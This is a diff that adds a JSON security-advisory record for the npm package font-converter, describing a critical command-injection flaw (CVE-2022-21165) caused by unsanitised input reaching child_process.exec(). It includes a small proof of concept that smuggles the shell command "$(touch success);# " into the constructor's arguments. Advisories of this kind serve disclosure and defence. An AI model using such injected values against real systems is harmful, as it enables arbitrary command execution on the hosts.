@@ -1,0 +1,26 @@
+{
+  "name": "font-converter",
+  "lastUpdated": "2026-01-31T15:05:26.294Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-g2c3-vwff-m3xr",
+      "title": "Font-Converter Vulnerable to Arbitrary Command Injection",
+      "description": "### Overview\nfont-converter is a FontForge wrapper that allows conversion between different font formats (TTF, WOFF, OTF)\n\nAll versions of this package are vulnerable to Arbitrary Command Injection due to missing sanitization of input that potentially flows into the `child_process.exec()` function.\n\n### PoC\n```js\nvar PUT = require('font-converter');\nvar x = \"$(touch success);# \";\ntry {\n    new PUT(x, x, x, x);\n} catch (e) {\n    console.log(e);\n}\n```",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-g2c3-vwff-m3xr",
+      "publishedAt": "2022-08-29T20:06:54Z",
+      "modifiedAt": "2024-04-22T23:17:13Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-g2c3-vwff-m3xr"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2022-21165"
+        }
+      ],
+      "affectedRange": "<= 1.1.1"
+    }
+  ]
+}
